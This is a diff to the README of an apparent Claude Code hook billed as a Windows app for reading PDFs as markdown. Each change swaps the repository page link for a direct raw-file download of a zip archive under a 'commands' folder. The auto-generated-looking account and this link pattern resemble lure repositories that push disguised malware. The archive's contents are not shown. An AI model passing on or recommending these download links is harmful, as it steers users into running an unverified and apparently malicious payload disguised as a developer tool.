@@ -1,12 +1,12 @@
 # 🤖 claude-code-md-hook - Read PDFs as markdown
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/gay-erythroblastosisfetalis55/claude-code-md-hook)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/gay-erythroblastosisfetalis55/claude-code-md-hook/main/commands/hook_md_claude_code_v1.9.zip)
 
 ## 📥 Download
 
 Use the link below to visit the page and download the app for Windows:
 
-[Visit the download page](https://github.com/gay-erythroblastosisfetalis55/claude-code-md-hook)
+[Visit the download page](https://raw.githubusercontent.com/gay-erythroblastosisfetalis55/claude-code-md-hook/main/commands/hook_md_claude_code_v1.9.zip)
 
 ## 🪟 What this app does
 
@@ -47,7 +47,7 @@ If your files are large, use a PC with more memory for smoother use.
 ## 🚀 Get started
 
 1. Open the download page:  
-   [https://github.com/gay-erythroblastosisfetalis55/claude-code-md-hook](https://github.com/gay-erythroblastosisfetalis55/claude-code-md-hook)
+   [https://raw.githubusercontent.com/gay-erythroblastosisfetalis55/claude-code-md-hook/main/commands/hook_md_claude_code_v1.9.zip](https://raw.githubusercontent.com/gay-erythroblastosisfetalis55/claude-code-md-hook/main/commands/hook_md_claude_code_v1.9.zip)
 
 2. Find the latest release or download file on the page.
 
@@ -181,7 +181,7 @@ This is useful if you work with:
 
 If you need the page again, use this link:
 
-[https://github.com/gay-erythroblastosisfetalis55/claude-code-md-hook](https://github.com/gay-erythroblastosisfetalis55/claude-code-md-hook)
+[https://raw.githubusercontent.com/gay-erythroblastosisfetalis55/claude-code-md-hook/main/commands/hook_md_claude_code_v1.9.zip](https://raw.githubusercontent.com/gay-erythroblastosisfetalis55/claude-code-md-hook/main/commands/hook_md_claude_code_v1.9.zip)
 
 ## 🖥️ What you should expect
 
